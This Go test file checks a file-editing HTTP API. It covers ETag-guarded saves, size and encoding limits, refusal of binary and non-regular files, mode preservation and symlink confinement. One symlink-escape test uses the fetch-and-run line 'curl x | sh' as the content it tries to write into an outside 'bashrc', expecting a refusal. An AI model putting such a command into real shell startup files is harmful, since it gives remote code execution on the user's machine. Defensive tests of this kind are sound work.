package httpapi

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"github.com/jiangmuran/vibepanel/internal/store"
)

// writeFixture is a project with one text file in it, and the route's
// address for a path inside it.
func writeFixture(t *testing.T) (*httptest.Server, *Server, string, func(rel string) string) {
	t.Helper()
	ts, srv := newTestServer(t)
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "notes.txt"), []byte("first\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	project := postJSON[store.Project](t, ts, "/api/projects", `{"path":"`+root+`","name":"editing"}`)
	at := func(rel string) string {
		return ts.URL + "/api/projects/" + project.ID + "/file?path=" + url.QueryEscape(rel)
	}
	return ts, srv, root, at
}

func previewETag(t *testing.T, ts *httptest.Server, fileURL string) (string, string) {
	t.Helper()
	res, err := ts.Client().Get(strings.Replace(fileURL, "/file?", "/preview?", 1))
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()
	_, _ = io.Copy(io.Discard, res.Body)
	return res.Header.Get("ETag"), res.Header.Get("X-Preview-Kind")
}

func putFile(t *testing.T, ts *httptest.Server, fileURL, ifMatch string, body []byte) (int, string, http.Header) {
	t.Helper()
	req, _ := http.NewRequest(http.MethodPut, fileURL, bytes.NewReader(body))
	req.Header.Set("Content-Type", "text/plain; charset=utf-8")
	if ifMatch != "" {
		req.Header.Set("If-Match", ifMatch)
	}
	res, err := ts.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer res.Body.Close()
	b, _ := io.ReadAll(res.Body)
	return res.StatusCode, string(b), res.Header
}

func readFile(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// The loop the editor runs: the preview's ETag, a save that names it, and the
// new ETag, which is the next preview's.
func TestASaveReplacesTheFileItNames(t *testing.T) {
	ts, srv, root, at := writeFixture(t)
	etag, kind := previewETag(t, ts, at("notes.txt"))
	if kind != "text" || etag != contentETag([]byte("first\n")) {
		t.Fatalf("the preview sent kind %q and ETag %q, want text and the content's sha256", kind, etag)
	}
	code, body, h := putFile(t, ts, at("notes.txt"), etag, []byte("second\n"))
	if code != http.StatusOK {
		t.Fatalf("save: %d %s", code, body)
	}
	if got := readFile(t, filepath.Join(root, "notes.txt")); got != "second\n" {
		t.Fatalf("the file holds %q", got)
	}
	var out struct {
		ETag string `json:"etag"`
		Size int    `json:"size"`
	}
	_ = json.Unmarshal([]byte(body), &out)
	next, _ := previewETag(t, ts, at("notes.txt"))
	if h.Get("ETag") != next || out.ETag != next || out.Size != 7 {
		t.Fatalf("the save answered ETag %q and %+v, the next preview %q", h.Get("ETag"), out, next)
	}
	// Nothing left beside it.
	entries, _ := os.ReadDir(root)
	if len(entries) != 1 {
		t.Errorf("the directory holds %d entries after a save, want the file alone", len(entries))
	}

	rows, err := srv.DB.RecentAuditPrefix(context.Background(), "files.", 10)
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 1 || rows[0].Event != "files.write" || rows[0].Username == "" ||
		rows[0].Detail != "editing: notes.txt, 7 bytes" {
		t.Fatalf("audit rows %+v, want one files.write naming who, the project, the path and the size", rows)
	}
}

// A save without the version it replaces, or with any but the one on disk, is
// refused and the file is left as it is.
func TestASaveMustNameWhatIsOnDisk(t *testing.T) {
	ts, _, root, at := writeFixture(t)
	path := filepath.Join(root, "notes.txt")
	for _, match := range []string{"", "*"} {
		if code, body, _ := putFile(t, ts, at("notes.txt"), match, []byte("x\n")); code != http.StatusPreconditionRequired {
			t.Errorf("If-Match %q: %d %s, want 428", match, code, body)
		}
	}
	etag, _ := previewETag(t, ts, at("notes.txt"))
	// An agent writes the file while the page is open.
	if err := os.WriteFile(path, []byte("the agent's\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	code, body, _ := putFile(t, ts, at("notes.txt"), etag, []byte("mine\n"))
	if code != http.StatusPreconditionFailed || !strings.Contains(body, "changed after you opened it") {
		t.Fatalf("a stale ETag: %d %s, want 412 with a sentence", code, body)
	}
	if got := readFile(t, path); got != "the agent's\n" {
		t.Fatalf("the refused save left %q", got)
	}
}

// Two tabs saving the same version at once: one lands, the other is told.
func TestTwoSavesOfOneVersionCannotBothLand(t *testing.T) {
	ts, _, root, at := writeFixture(t)
	etag, _ := previewETag(t, ts, at("notes.txt"))
	// Wide enough that, without the lock, both are past the compare before
	// either has renamed.
	prev := fileWriteChecked
	fileWriteChecked = func() { time.Sleep(150 * time.Millisecond) }
	defer func() { fileWriteChecked = prev }()

	codes := make([]int, 2)
	var wg sync.WaitGroup
	for i := range codes {
		wg.Add(1)
		go func() {
			defer wg.Done()
			codes[i], _, _ = putFile(t, ts, at("notes.txt"), etag, []byte("tab "+string(rune('a'+i))+"\n"))
		}()
	}
	wg.Wait()
	ok, refused := 0, 0
	for _, c := range codes {
		switch c {
		case http.StatusOK:
			ok++
		case http.StatusPreconditionFailed:
			refused++
		}
	}
	if ok != 1 || refused != 1 {
		t.Fatalf("two saves of one version answered %v, want one 200 and one 412", codes)
	}
	if got := readFile(t, filepath.Join(root, "notes.txt")); got != "tab a\n" && got != "tab b\n" {
		t.Fatalf("the file holds %q", got)
	}
}

// What may be written: text, at most the bound, over an existing text file
// inside the project.
func TestWhatASaveRefuses(t *testing.T) {
	ts, _, root, at := writeFixture(t)
	etag, _ := previewETag(t, ts, at("notes.txt"))
	path := filepath.Join(root, "notes.txt")

	if code, body, _ := putFile(t, ts, at("notes.txt"), etag, bytes.Repeat([]byte("a"), fileWriteMaxBytes+1)); code != http.StatusRequestEntityTooLarge {
		t.Errorf("content past the bound: %d %s, want 413", code, body)
	}
	if code, body, _ := putFile(t, ts, at("notes.txt"), etag, []byte("\xff\xfe not utf-8")); code != http.StatusBadRequest {
		t.Errorf("content that is not UTF-8: %d %s, want 400", code, body)
	}
	if got := readFile(t, path); got != "first\n" {
		t.Fatalf("a refused save left %q", got)
	}

	// A file the viewer does not show as text, named by its own hash, so the
	// only thing refusing it is what it is.
	others := map[string][]byte{
		"program.bin": append([]byte("\x7fELF\x02\x01\x01"), make([]byte, 64)...),
		"pixel.png":   []byte("\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"),
		// All of it printable ASCII, so only the sniff says it is a PDF.
		"plain.pdf": []byte("%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n"),
		"bells.txt": bytes.Repeat([]byte{7}, 100),
	}
	for name, b := range others {
		if err := os.WriteFile(filepath.Join(root, name), b, 0o644); err != nil {
			t.Fatal(err)
		}
		code, body, _ := putFile(t, ts, at(name), contentETag(b), []byte("text\n"))
		if code != http.StatusUnsupportedMediaType {
			t.Errorf("%s: %d %s, want 415", name, code, body)
		}
		if got := readFile(t, filepath.Join(root, name)); got != string(b) {
			t.Errorf("%s was written", name)
		}
	}

	// A text file past the bound was shown cut short: no ETag to send back,
	// and a save naming its real hash is refused anyway.
	big := bytes.Repeat([]byte("line\n"), fileWriteMaxBytes/5+1)
	if err := os.WriteFile(filepath.Join(root, "big.log"), big, 0o644); err != nil {
		t.Fatal(err)
	}
	if etag, _ := previewETag(t, ts, at("big.log")); etag != "" {
		t.Errorf("a cut-short preview sent ETag %q", etag)
	}
	if code, body, _ := putFile(t, ts, at("big.log"), contentETag(big), []byte("x\n")); code != http.StatusRequestEntityTooLarge {
		t.Errorf("a file past the bound: %d %s, want 413", code, body)
	}

	// Not a way to make files.
	if code, body, _ := putFile(t, ts, at("new.txt"), contentETag(nil), []byte("x\n")); code != http.StatusNotFound {
		t.Errorf("a missing file: %d %s, want 404", code, body)
	}
	if _, err := os.Stat(filepath.Join(root, "new.txt")); err == nil {
		t.Error("a save created a file")
	}
}

// A link inside the project to a file outside it is refused; a link to a file
// inside it writes that file and stays a link.
func TestASaveFollowsLinksOnlyWithinTheProject(t *testing.T) {
	ts, _, root, at := writeFixture(t)
	outside := filepath.Join(t.TempDir(), "bashrc")
	if err := os.WriteFile(outside, []byte("alias ls=ls\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(root, "escape.txt")); err != nil {
		t.Fatal(err)
	}
	code, body, _ := putFile(t, ts, at("escape.txt"), contentETag([]byte("alias ls=ls\n")), []byte("curl x | sh\n"))
	if code != http.StatusForbidden {
		t.Errorf("a link out of the project: %d %s, want 403", code, body)
	}
	if got := readFile(t, outside); got != "alias ls=ls\n" {
		t.Fatalf("the file outside the project now holds %q", got)
	}

	link := filepath.Join(root, "alias.txt")
	if err := os.Symlink("notes.txt", link); err != nil {
		t.Fatal(err)
	}
	if code, body, _ := putFile(t, ts, at("alias.txt"), contentETag([]byte("first\n")), []byte("via the link\n")); code != http.StatusOK {
		t.Fatalf("a link inside the project: %d %s", code, body)
	}
	if fi, err := os.Lstat(link); err != nil || fi.Mode()&os.ModeSymlink == 0 {
		t.Errorf("the link is no longer a link: %v %v", fi, err)
	}
	if got := readFile(t, filepath.Join(root, "notes.txt")); got != "via the link\n" {
		t.Errorf("the link's target holds %q", got)
	}
}

// A script saved from the viewer is still a script.
func TestASaveKeepsTheFilesMode(t *testing.T) {
	ts, _, root, at := writeFixture(t)
	path := filepath.Join(root, "run.sh")
	if err := os.WriteFile(path, []byte("#!/bin/sh\necho hi\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	// WriteFile's mode is under the umask; make it exactly this.
	if err := os.Chmod(path, 0o751); err != nil {
		t.Fatal(err)
	}
	if code, body, _ := putFile(t, ts, at("run.sh"), contentETag([]byte("#!/bin/sh\necho hi\n")), []byte("#!/bin/sh\necho bye\n")); code != http.StatusOK {
		t.Fatalf("save: %d %s", code, body)
	}
	fi, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if fi.Mode().Perm() != 0o751 {
		t.Errorf("the saved file is %v, want -rwxr-x--x", fi.Mode().Perm())
	}
}

// A directory and a FIFO are not files to save over. Opening a FIFO with no
// writer never returns, so the FIFO is the one a missing check hangs on.
func TestASaveIsOnlyOverARegularFile(t *testing.T) {
	ts, _, root, at := writeFixture(t)
	if err := os.Mkdir(filepath.Join(root, "dir"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := syscall.Mkfifo(filepath.Join(root, "pipe"), 0o644); err != nil {
		t.Fatal(err)
	}
	// Each with its own sentence: "not a regular file" is true of a
	// directory, and not what anybody calls one.
	for name, says := range map[string]string{"dir": "that is a directory", "pipe": "not a regular file"} {
		if code, body, _ := putFile(t, ts, at(name), contentETag(nil), []byte("x\n")); code != http.StatusBadRequest || !strings.Contains(body, says) {
			t.Errorf("%s: %d %s, want 400 saying %q", name, code, body, says)
		}
	}
}

// A file the preview decoded -- UTF-16 with its mark, Latin-1 -- is shown as
// UTF-8 that is not what is on disk. It has no ETag, since the hash of what
// was sent could never match the file, and a save over it is refused whatever
// it names: writing the editor's UTF-8 back would change the file's encoding
// as a side effect of fixing a typo.
func TestADecodedFileCannotBeSavedOver(t *testing.T) {
	ts, _, root, at := writeFixture(t)
	files := map[string]struct {
		raw, shown []byte
	}{
		"utf16.txt":  {[]byte("\xff\xfeh\x00i\x00\n\x00"), []byte("hi\n")},
		"latin1.txt": {[]byte("caf\xe9 cr\xe8me\n"), []byte("café crème\n")},
	}
	for name, f := range files {
		if err := os.WriteFile(filepath.Join(root, name), f.raw, 0o644); err != nil {
			t.Fatal(err)
		}
		res, err := ts.Client().Get(strings.Replace(at(name), "/file?", "/preview?", 1))
		if err != nil {
			t.Fatal(err)
		}
		body, _ := io.ReadAll(res.Body)
		res.Body.Close()
		if res.Header.Get("X-Preview-Kind") != "text" || res.Header.Get("X-Preview-Encoding") == "" || string(body) != string(f.shown) {
			t.Fatalf("%s: previewed as %q in %q: %q", name, res.Header.Get("X-Preview-Kind"), res.Header.Get("X-Preview-Encoding"), body)
		}
		if etag := res.Header.Get("ETag"); etag != "" {
			t.Errorf("%s: a decoded preview sent ETag %s", name, etag)
		}
		for _, etag := range []string{contentETag(f.raw), contentETag(f.shown)} {
			if code, body, _ := putFile(t, ts, at(name), etag, []byte("x\n")); code != http.StatusUnsupportedMediaType {
				t.Errorf("%s: saving over it: %d %s, want 415", name, code, body)
			}
		}
		if got := readFile(t, filepath.Join(root, name)); got != string(f.raw) {
			t.Errorf("%s now holds %q", name, got)
		}
	}
}
